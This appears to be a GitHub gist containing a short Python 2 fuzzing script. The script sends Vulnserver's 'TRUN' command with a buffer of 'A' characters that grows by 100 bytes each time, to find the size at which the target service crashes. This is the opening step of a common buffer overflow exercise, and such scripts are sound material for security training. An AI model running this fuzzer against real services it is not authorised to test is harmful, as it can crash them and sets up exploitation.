#date: 2022-11-17T17:09:49Z
#url: https://api.github.com/gists/f10876beeee109359a7936ec79ccee25
#owner: https://api.github.com/users/Tamirye

#!/usr/bin/python2
import sys
import socket
from time import sleep

buff = "A" * 100

while True:
	try:
		print '[+] Sending buffer of %s bytes' % str(len(buff))
		soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        	soc.connect(('<server-ip>', 9999))
		payload = 'TRUN /.:/' + buff
        	soc.send(payload)
		soc.close()
		sleep(1)
		buff = buff + "A" * 100

	except:
		print "[!] Fuzzing crashed at %s bytes" % str(len(buff))
		sys.exit()
